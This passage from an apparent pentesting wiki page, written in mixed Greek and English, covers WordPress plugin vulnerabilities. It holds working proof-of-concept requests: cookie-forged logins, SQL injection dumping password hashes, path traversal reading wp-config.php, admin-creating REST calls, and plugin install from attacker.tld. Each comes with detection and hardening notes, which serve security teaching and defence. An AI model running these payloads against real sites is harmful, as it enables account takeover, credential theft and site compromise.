- Διαβάζουν usernames από `$_REQUEST` / `$_GET` / `$_POST`.
- Τροποποιούν roles μέσω `add_role()` / `remove_role()` χωρίς `current_user_can()` και `wp_verify_nonce()` / `check_admin_referer()`.
- Εξουσιοδοτούν με βάση ένα plugin option array (π.χ. `viewing_admin_as_role_are`) αντί για τις capabilities του actor.

---

### Unauthenticated privilege escalation via cookie‑trusted user switching on public init (Service Finder “sf-booking”)

Κάποια plugins συνδέουν user-switching helpers στο public `init` hook και εξάγουν ταυτότητα από ένα client-controlled cookie. Εάν ο κώδικας καλεί `wp_set_auth_cookie()` χωρίς να επαληθεύει authentication, capability και ένα έγκυρο nonce, οποιοσδήποτε unauthenticated επισκέπτης μπορεί να force login ως οποιοδήποτε user ID.

Typical vulnerable pattern (simplified from Service Finder Bookings ≤ 6.1):
```php
function service_finder_submit_user_form(){
if ( isset($_GET['switch_user']) && is_numeric($_GET['switch_user']) ) {
$user_id = intval( sanitize_text_field($_GET['switch_user']) );
service_finder_switch_user($user_id);
}
if ( isset($_GET['switch_back']) ) {
service_finder_switch_back();
}
}
add_action('init', 'service_finder_submit_user_form');

function service_finder_switch_back() {
if ( isset($_COOKIE['original_user_id']) ) {
$uid = intval($_COOKIE['original_user_id']);
if ( get_userdata($uid) ) {
wp_set_current_user($uid);
wp_set_auth_cookie($uid);  // 🔥 sets auth for attacker-chosen UID
do_action('wp_login', get_userdata($uid)->user_login, get_userdata($uid));
setcookie('original_user_id', '', time() - 3600, '/');
wp_redirect( admin_url('admin.php?page=candidates') );
exit;
}
wp_die('Original user not found.');
}
wp_die('No original user found to switch back to.');
}
```
Γιατί είναι εκμεταλλεύσιμο

- Ο δημόσιος `init` hook καθιστά τον handler προσβάσιμο από μη αυθεντικοποιημένους χρήστες (χωρίς έλεγχο `is_user_logged_in()`).
- Η ταυτότητα προέρχεται από cookie που μπορεί να τροποποιηθεί από τον client (`original_user_id`).
- Άμεση κλήση της `wp_set_auth_cookie($uid)` συνδέει τον αιτούντα ως αυτόν τον χρήστη χωρίς έλεγχο δικαιωμάτων/nonce.

Εκμετάλλευση (χωρίς έλεγχο ταυτότητας)
```http
GET /?switch_back=1 HTTP/1.1
Host: victim.example
Cookie: original_user_id=1
User-Agent: PoC
Connection: close
```
---

### WAF considerations for WordPress/plugin CVEs

Generic edge/server WAFs are tuned for broad patterns (SQLi, XSS, LFI). Many high‑impact WordPress/plugin flaws are application-specific logic/auth bugs that look like benign traffic unless the engine understands WordPress routes and plugin semantics.

Offensive notes

- Target plugin-specific endpoints with clean payloads: `admin-ajax.php?action=...`, `wp-json/<namespace>/<route>`, custom file handlers, shortcodes.
- Exercise unauth paths first (AJAX `nopriv`, REST with permissive `permission_callback`, public shortcodes). Default payloads often succeed without obfuscation.
- Typical high-impact cases: privilege escalation (broken access control), arbitrary file upload/download, LFI, open redirect.

Defensive notes

- Don’t rely on generic WAF signatures to protect plugin CVEs. Implement application-layer, vulnerability-specific virtual patches or update quickly.
- Prefer positive-security checks in code (capabilities, nonces, strict input validation) over negative regex filters.

## WordPress Protection

### Regular Updates

Make sure WordPress, plugins, and themes are up to date. Also confirm that automated updating is enabled in wp-config.php:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
Επίσης, **εγκαταστήστε μόνο αξιόπιστα WordPress πρόσθετα και θέματα**.

### Πρόσθετα Ασφαλείας

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **Άλλες Συστάσεις**

- Αφαιρέστε τον προεπιλεγμένο χρήστη **admin**
- Χρησιμοποιήστε **ισχυρούς κωδικούς** και **2FA**
- Περιοδικά **ελέγχετε** τα **δικαιώματα** των χρηστών
- **Περιορίστε τις προσπάθειες σύνδεσης** για να αποτρέψετε επιθέσεις Brute Force
- Μετονομάστε το αρχείο **`wp-admin.php`** και επιτρέπετε πρόσβαση μόνο εσωτερικά ή από συγκεκριμένες διευθύνσεις IP.


### Μη αυθεντικοποιημένη SQL Injection λόγω ανεπαρκούς επικύρωσης (WP Job Portal <= 2.3.2)

Το WP Job Portal recruitment plugin αποκάλυπτε μια εργασία **savecategory** που τελικά εκτελεί τον ακόλουθο ευάλωτο κώδικα μέσα στο `modules/category/model.php::validateFormData()`:
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat ✗
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
Προβλήματα που εισάγει αυτό το απόσπασμα:

1. **Μη εξουδετερωμένη είσοδος χρήστη** – `parentid` προέρχεται απευθείας από το αίτημα HTTP.
2. **Συνένωση συμβολοσειρών μέσα στο WHERE clause** – δεν υπάρχει `is_numeric()` / `esc_sql()` / prepared statement.
3. **Προσβασιμότητα χωρίς έλεγχο ταυτότητας** – παρόλο που η ενέργεια εκτελείται μέσω του `admin-post.php`, ο μοναδικός έλεγχος είναι ένα **CSRF nonce** (`wp_verify_nonce()`), το οποίο οποιοσδήποτε επισκέπτης μπορεί να ανακτήσει από μια δημόσια σελίδα που ενσωματώνει το shortcode `[wpjobportal_my_resumes]`.

#### Εκμετάλλευση

1. Πάρε ένα νέο nonce:
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. Κατάχρηση του `parentid` για εισαγωγή αυθαίρετου SQL:
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
Η απάντηση αποκαλύπτει το αποτέλεσμα του εγχεόμενου query ή αλλάζει τη βάση δεδομένων, αποδεικνύοντας SQLi.


### Μη πιστοποιημένη Arbitrary File Download / Path Traversal (WP Job Portal <= 2.3.2)

Άλλη λειτουργία, **downloadcustomfile**, επέτρεπε στους επισκέπτες να κατεβάσουν **οποιοδήποτε αρχείο στο δίσκο** μέσω path traversal. Ο ευάλωτος sink βρίσκεται στο `modules/customfield/model.php::downloadCustomUploadedFile()`:
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` είναι attacker-controlled και συγχωνεύεται **without sanitisation**. Ξανά, το μόνο εμπόδιο είναι ένα **CSRF nonce** που μπορεί να ανακτηθεί από τη σελίδα βιογραφικού.

#### Εκμετάλλευση
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
Ο διακομιστής αποκρίνεται με τα περιεχόμενα του `wp-config.php`, leaking DB credentials and auth keys.

## Ανώνυμη ανάληψη λογαριασμού μέσω Social Login AJAX fallback (Jobmonster Theme <= 4.7.9)

Πολλά themes/plugins παρέχουν "social login" helpers εκτεθειμένους μέσω admin-ajax.php. Αν μια μη-επαληθευμένη AJAX ενέργεια (wp_ajax_nopriv_...) εμπιστεύεται client-supplied identifiers όταν τα δεδομένα του provider λείπουν και στη συνέχεια καλεί wp_set_auth_cookie(), αυτό μετατρέπεται σε πλήρη authentication bypass.

Τυπικό ελαττωματικό μοτίβο (απλοποιημένο)
```php
public function check_login() {
// ... request parsing ...
switch ($_POST['using']) {
case 'fb':     /* set $user_email from verified Facebook token */ break;
case 'google': /* set $user_email from verified Google token   */ break;
// other providers ...
default: /* unsupported/missing provider – execution continues */ break;
}

// FALLBACK: trust POSTed "id" as email if provider data missing
$user_email = !empty($user_email)
? $user_email
: (!empty($_POST['id']) ? esc_attr($_POST['id']) : '');

if (empty($user_email)) {
wp_send_json(['status' => 'not_user']);
}

$user = get_user_by('email', $user_email);
if ($user) {
wp_set_auth_cookie($user->ID, true); // 🔥 logs requester in as that user
wp_send_json(['status' => 'success', 'message' => 'Login successfully.']);
}
wp_send_json(['status' => 'not_user']);
}
// add_action('wp_ajax_nopriv_<social_login_action>', [$this, 'check_login']);
```
Γιατί είναι εκμεταλλεύσιμο

- Προσβάσιμο χωρίς έλεγχο ταυτότητας μέσω admin-ajax.php (wp_ajax_nopriv_… action).
- Δεν υπάρχουν έλεγχοι nonce/capability πριν από αλλαγή κατάστασης.
- Έλλειψη επαλήθευσης OAuth/OpenID provider· το default branch αποδέχεται είσοδο του επιτιθέμενου.
- get_user_by('email', $_POST['id']) ακολουθούμενο από wp_set_auth_cookie($uid) αυθεντικοποιεί τον αιτούντα ως οποιαδήποτε υπάρχουσα διεύθυνση email.

Εκμετάλλευση (χωρίς πιστοποίηση)

- Προαπαιτούμενα: ο επιτιθέμενος μπορεί να προσπελάσει /wp-admin/admin-ajax.php και γνωρίζει/μαντεύει μια έγκυρη διεύθυνση email χρήστη.
- Ορίστε τον provider σε μια μη υποστηριζόμενη τιμή (ή παραλείψτε τον) για να ενεργοποιηθεί το default branch και να περάσετε id=<victim_email>.
```http
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: victim.tld
Content-Type: application/x-www-form-urlencoded

action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com
```

```bash
curl -i -s -X POST https://victim.tld/wp-admin/admin-ajax.php \
-d "action=<vulnerable_social_login_action>&using=bogus&id=admin%40example.com"
```
Αναμενόμενοι δείκτες επιτυχίας

- HTTP 200 με JSON σώμα όπως {"status":"success","message":"Login successfully."}.
- Set-Cookie: wordpress_logged_in_* για τον χρήστη-θύμα· οι επακόλουθες αιτήσεις είναι αυθεντικοποιημένες.

Εύρεση του ονόματος της ενέργειας

- Ελέγξτε το theme/plugin για καταχωρίσεις add_action('wp_ajax_nopriv_...', '...') στον κώδικα social login (π.χ., framework/add-ons/social-login/class-social-login.php).
- Χρησιμοποιήστε grep για wp_set_auth_cookie(), get_user_by('email', ...) μέσα σε χειριστές AJAX.

Λίστα ελέγχου ανίχνευσης

- Web logs που δείχνουν μη-αυθεντικοποιημένα POSTs προς /wp-admin/admin-ajax.php με το action social-login και id=<email>.
- Απαντήσεις 200 με το success JSON αμέσως πριν από αυθεντικοποιημένη κίνηση από την ίδια IP/User-Agent.

Σκληροποίηση

- Μην προκύπτει η ταυτότητα από είσοδο του client. Αποδεχτείτε μόνο emails/IDs που προέρχονται από επικυρωμένο provider token/ID.
- Απαιτήστε CSRF nonces και ελέγχους δυνατοτήτων (capability checks) ακόμη και για login helpers· αποφύγετε την εγγραφή wp_ajax_nopriv_ εκτός αν είναι απολύτως αναγκαίο.
- Επικυρώστε και επαληθεύστε server-side τις απαντήσεις OAuth/OIDC· απορρίψτε απουσία/μη έγκυρους providers (μην κάνετε fallback σε POST id).
- Σκεφτείτε προσωρινή απενεργοποίηση του social login ή virtual patching στο edge (block the vulnerable action) μέχρι να διορθωθεί.

Patched behaviour (Jobmonster 4.8.0)

- Αφαιρέθηκε το μη ασφαλές fallback από $_POST['id']; $user_email πρέπει να προέρχεται από verified provider branches στο switch($_POST['using']).

## Μη αυθεντικοποιημένη κλιμάκωση προνομίων μέσω REST token/key minting σε προβλέψιμη ταυτότητα (OttoKit/SureTriggers ≤ 1.0.82)

Ορισμένα plugins εκθέτουν REST endpoints που δημιουργούν επαναχρησιμοποιήσιμα “connection keys” ή tokens χωρίς να επαληθεύουν τις δυνατότητες (capabilities) του καλούντος. Αν η διαδρομή (route) αυθεντικοποιεί μόνο με ένα προβλέψιμο χαρακτηριστικό (π.χ., username) και δεν δένει το key σε χρήστη/σέσσιο με ελέγχους δυνατοτήτων, οποιοσδήποτε μη-αυθεντικοποιημένος επιτιθέμενος μπορεί να δημιουργήσει ένα key και να καλέσει προνομιούχες ενέργειες (δημιουργία admin account, plugin actions → RCE).

- Vulnerable route (example): sure-triggers/v1/connection/create-wp-connection
- Flaw: accepts a username, issues a connection key without current_user_can() or a strict permission_callback
- Impact: full takeover by chaining the minted key to internal privileged actions

PoC – mint a connection key and use it
```bash
# 1) Obtain key (unauthenticated). Exact payload varies per plugin
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/connection/create-wp-connection" \
-H 'Content-Type: application/json' \
--data '{"username":"admin"}'
# → {"key":"<conn_key>", ...}

# 2) Call privileged plugin action using the minted key (namespace/route vary per plugin)
curl -s -X POST "https://victim.tld/wp-json/sure-triggers/v1/users" \
-H 'Content-Type: application/json' \
-H 'X-Connection-Key: <conn_key>' \
--data '{"username":"pwn","email":"p@t.ld","password":"p@ss","role":"administrator"}'
```
Γιατί είναι εκμεταλλεύσιμο
- Ευαίσθητη REST route προστατευμένη μόνο από απόδειξη ταυτότητας χαμηλής εντροπίας (username) ή χωρίς permission_callback
- Καμία επιβολή capability; το minted key γίνεται αποδεκτό ως καθολική παράκαμψη

Λίστα ελέγχου εντοπισμού
- Ψάξτε στον κώδικα του plugin για register_rest_route(..., [ 'permission_callback' => '__return_true' ])
- Οποιαδήποτε route που εκδίδει tokens/keys βάσει ταυτότητας που παρέχεται στο request (username/email) χωρίς να τη συνδέει με επικυρωμένο χρήστη ή capability
- Αναζητήστε μετέπειτα routes που αποδέχονται το minted token/key χωρίς ελέγχους capability στην πλευρά του server

Σκληρυνση
- Για κάθε privileged REST route: απαιτήστε permission_callback που επιβάλλει current_user_can() για την απαιτούμενη capability
- Μην εκδίδετε long-lived keys από ταυτότητα που παρέχει ο client; αν χρειάζεται, εκδώστε short-lived, user-bound tokens μετά από authentication και επανελέγχετε τις capabilities κατά τη χρήση
- Επικυρώστε το user context του καλούντος (wp_set_current_user είναι από μόνο του ανεπαρκές) και απορρίψτε αιτήματα όπου !is_user_logged_in() || !current_user_can(<cap>)

---

## Nonce gate misuse → unauthenticated arbitrary plugin installation (FunnelKit Automations ≤ 3.5.3)

Τα Nonces αποτρέπουν CSRF, όχι την εξουσιοδότηση. Αν ο κώδικας θεωρεί την επιβεβαίωση ενός nonce ως πράσινο φως και παρακάμπτει τους ελέγχους capability για προνομιούχες ενέργειες (π.χ. install/activate plugins), μη αυθεντικοποιημένοι επιτιθέμενοι μπορούν να ικανοποιήσουν μια αδύναμη απαίτηση nonce και να φτάσουν σε RCE εγκαθιστώντας ένα backdoored ή ευάλωτο plugin.

- Ευάλωτο μονοπάτι: plugin/install_and_activate
- Σφάλμα: ασθενής έλεγχος nonce hash; δεν υπάρχει current_user_can('install_plugins'|'activate_plugins') μόλις το nonce “περάσει”
- Επίπτωση: πλήρης παραβίαση μέσω αυθαίρετης εγκατάστασης/ενεργοποίησης plugin

PoC (το σχήμα εξαρτάται από το plugin; ενδεικτικό μόνο)
```bash
curl -i -s -X POST https://victim.tld/wp-json/<fk-namespace>/plugin/install_and_activate \
-H 'Content-Type: application/json' \
--data '{"_nonce":"<weak-pass>","slug":"hello-dolly","source":"https://attacker.tld/mal.zip"}'
```
Detection checklist
- REST/AJAX handlers that modify plugins/themes with only wp_verify_nonce()/check_admin_referer() and no capability check
- Any code path that sets $skip_caps = true after nonce validation

Hardening
- Always treat nonces as CSRF tokens only; enforce capability checks regardless of nonce state
- Require current_user_can('install_plugins') and current_user_can('activate_plugins') before reaching installer code
- Reject unauthenticated access; avoid exposing nopriv AJAX actions for privileged flows

---

## SQLi χωρίς αυθεντικοποίηση μέσω της παραμέτρου s (search) σε depicter-* actions (Depicter Slider ≤ 3.6.1)

Πολλές depicter-* actions κατανάλωσαν την παράμετρο s (search) και τη συνέδεσαν σε ερωτήματα SQL χωρίς παραμετροποίηση.

- Παράμετρος: s (search)
- Ελάττωμα: direct string concatenation in WHERE/LIKE clauses; no prepared statements/sanitization
- Επίπτωση: database exfiltration (users, hashes), lateral movement

PoC
```bash
# Replace action with the affected depicter-* handler on the target
curl -G "https://victim.tld/wp-admin/admin-ajax.php" \
--data-urlencode 'action=depicter_search' \
--data-urlencode "s=' UNION SELECT user_login,user_pass FROM wp_users-- -"
```
Detection checklist
- Ψάξτε με grep για depicter-* action handlers και για την άμεση χρήση των $_GET['s'] ή $_POST['s'] σε SQL
- Ελέγξτε custom queries που δίνονται στο $wpdb->get_results()/query() όταν γίνεται concatenation με s

Hardening
- Χρησιμοποιείτε πάντα $wpdb->prepare() ή wpdb placeholders· απορρίψτε μη αναμενόμενους μεταχαρακτήρες στην πλευρά του server
- Προσθέστε αυστηρή allowlist για το s και κανονικοποιήστε στο αναμενόμενο charset/μήκος

---

## Unauthenticated Local File Inclusion μέσω μη-επαληθευμένου template/file path (Kubio AI Page Builder ≤ 2.5.1)

Η αποδοχή paths ελεγχόμενων από attacker σε παράμετρο template χωρίς κανονικοποίηση/περιορισμό επιτρέπει την ανάγνωση αυθαίρετων τοπικών αρχείων, και μερικές φορές εκτέλεση κώδικα αν includable PHP/log αρχεία φορτωθούν στο runtime.

- Parameter: __kubio-site-edit-iframe-classic-template
- Flaw: no normalization/allowlisting; traversal permitted
- Impact: αποκάλυψη μυστικών (wp-config.php), πιθανό RCE σε συγκεκριμένα περιβάλλοντα (log poisoning, includable PHP)

PoC – ανάγνωση wp-config.php
```bash
curl -i "https://victim.tld/?__kubio-site-edit-iframe-classic-template=../../../../wp-config.php"
```
Λίστα ελέγχου ανίχνευσης
- Οποιοσδήποτε handler που συνενώνει request paths σε include()/require()/read sinks χωρίς περιορισμό μέσω realpath()
- Αναζητήστε μοτίβα traversal (../) που φτάνουν έξω από τον προοριζόμενο φάκελο templates

Σκληροποίηση
- Επιβάλετε allowlisted templates; επιλύστε με realpath() και απαιτήστε str_starts_with(realpath(file), realpath(allowed_base))
- Κανονικοποιήστε τα εισερχόμενα· απορρίψτε ακολουθίες traversal και απόλυτες διαδρομές· χρησιμοποιήστε sanitize_file_name() μόνο για ονόματα αρχείων (όχι για πλήρεις διαδρομές)


## Αναφορές

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset – delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)
- [Hosting security tested: 87.8% of vulnerability exploits bypassed hosting defenses](https://patchstack.com/articles/hosting-security-tested-87-percent-of-vulnerability-exploits-bypassed-hosting-defenses/)
- [WooCommerce Payments ≤ 5.6.1 – Unauth privilege escalation via trusted header (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/woocommerce-payments/vulnerability/wordpress-woocommerce-payments-plugin-5-6-1-unauthenticated-privilege-escalation-vulnerability)
- [Hackers exploiting critical WordPress WooCommerce Payments bug](https://www.bleepingcomputer.com/news/security/hackers-exploiting-critical-wordpress-woocommerce-payments-bug/)
- [Unpatched Privilege Escalation in Service Finder Bookings Plugin](https://patchstack.com/articles/unpatched-privilege-escalation-in-service-finder-bookings-plugin/)
- [Service Finder Bookings privilege escalation – Patchstack DB entry](https://patchstack.com/database/wordpress/plugin/sf-booking/vulnerability/wordpress-service-finder-booking-6-0-privilege-escalation-vulnerability)
- [Unauthenticated Broken Authentication Vulnerability in WordPress Jobmonster Theme](https://patchstack.com/articles/unauthenticated-broken-authentication-vulnerability-in-wordpress-jobmonster-theme/)
- [Q3 2025’s most exploited WordPress vulnerabilities and how RapidMitigate blocked them](https://patchstack.com/articles/q3-2025s-most-exploited-wordpress-vulnerabilities-and-how-patchstacks-rapidmitigate-blocked-them/)
- [OttoKit (SureTriggers) ≤ 1.0.82 – Privilege Escalation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/suretriggers/vulnerability/wordpress-suretriggers-1-0-82-privilege-escalation-vulnerability)
- [FunnelKit Automations ≤ 3.5.3 – Unauthenticated arbitrary plugin installation (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/wp-marketing-automations/vulnerability/wordpress-recover-woocommerce-cart-abandonment-newsletter-email-marketing-marketing-automation-by-funnelkit-plugin-3-5-3-missing-authorization-to-unauthenticated-arbitrary-plugin-installation-vulnerability)
- [Depicter Slider ≤ 3.6.1 – Unauthenticated SQLi via s parameter (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/depicter/vulnerability/wordpress-depicter-slider-plugin-3-6-1-unauthenticated-sql-injection-via-s-parameter-vulnerability)
- [Kubio AI Page Builder ≤ 2.5.1 – Unauthenticated LFI (Patchstack DB)](https://patchstack.com/database/wordpress/plugin/kubio/vulnerability/wordpress-kubio-ai-page-builder-plugin-2-5-1-unauthenticated-local-file-inclusion-vulnerability)

{{#include ../../banners/hacktricks-training.md}}
